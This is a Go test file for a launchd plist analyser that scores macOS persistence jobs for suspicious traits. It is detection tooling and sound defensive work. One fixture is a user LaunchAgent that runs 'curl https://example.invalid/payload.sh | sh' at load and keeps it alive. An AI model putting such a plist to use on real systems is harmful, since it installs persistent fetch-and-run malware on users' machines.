package launchd

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParsePlist(t *testing.T) {
	job, err := ParsePlist("/Library/LaunchDaemons/com.example.safe.plist", []byte(safePlist))
	if err != nil {
		t.Fatal(err)
	}

	if job.Label != "com.example.safe" {
		t.Fatalf("Label = %q, want com.example.safe", job.Label)
	}
	if job.Program != "/usr/local/bin/example" {
		t.Fatalf("Program = %q", job.Program)
	}
	if !job.RunAtLoad {
		t.Fatal("RunAtLoad = false, want true")
	}
	if job.KeepAlive {
		t.Fatal("KeepAlive = true, want false")
	}
}

func TestParseProgramArgumentsAndKeepAliveDict(t *testing.T) {
	job, err := ParsePlist("/Users/alice/Library/LaunchAgents/com.example.bad.plist", []byte(suspiciousPlist))
	if err != nil {
		t.Fatal(err)
	}

	if job.Label != "com.example.bad" {
		t.Fatalf("Label = %q", job.Label)
	}
	if len(job.ProgramArguments) != 4 {
		t.Fatalf("ProgramArguments = %#v, want 4 args", job.ProgramArguments)
	}
	if !job.KeepAlive || job.KeepAliveDetail != "dictionary" {
		t.Fatalf("KeepAlive = %v detail=%q, want dictionary true", job.KeepAlive, job.KeepAliveDetail)
	}
}

func TestScoreJob(t *testing.T) {
	job, err := ParsePlist("/Users/alice/Library/LaunchAgents/com.example.bad.plist", []byte(suspiciousPlist))
	if err != nil {
		t.Fatal(err)
	}

	findings := ScoreJob(job)
	for _, category := range []string{"USER_WRITABLE_PERSISTENCE", "SHELL_LAUNCHD_JOB", "NETWORK_DOWNLOADER_PERSISTENCE", "RUN_AT_LOAD", "KEEPALIVE_ENABLED"} {
		if !hasFinding(findings, category) {
			t.Fatalf("findings missing %s: %#v", category, findings)
		}
	}
}

func TestAnalyzeDirs(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "safe.plist"), []byte(safePlist), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "bad.plist"), []byte(suspiciousPlist), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "ignore.txt"), []byte("ignored"), 0644); err != nil {
		t.Fatal(err)
	}

	report := AnalyzeDirs([]string{dir})
	if len(report.Jobs) != 2 {
		t.Fatalf("Jobs length = %d, want 2", len(report.Jobs))
	}
	if !hasFinding(report.Findings, "USER_WRITABLE_PERSISTENCE") {
		t.Fatalf("Findings = %#v, want USER_WRITABLE_PERSISTENCE", report.Findings)
	}
}

func hasFinding(findings []Finding, category string) bool {
	for _, finding := range findings {
		if finding.Category == category {
			return true
		}
	}
	return false
}

const safePlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.example.safe</string>
  <key>Program</key>
  <string>/usr/local/bin/example</string>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <false/>
</dict>
</plist>`

const suspiciousPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.example.bad</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/sh</string>
    <string>-c</string>
    <string>curl https://example.invalid/payload.sh | sh</string>
    <string>/Users/alice/bin/start</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <dict>
    <key>SuccessfulExit</key>
    <false/>
  </dict>
</dict>
</plist>`
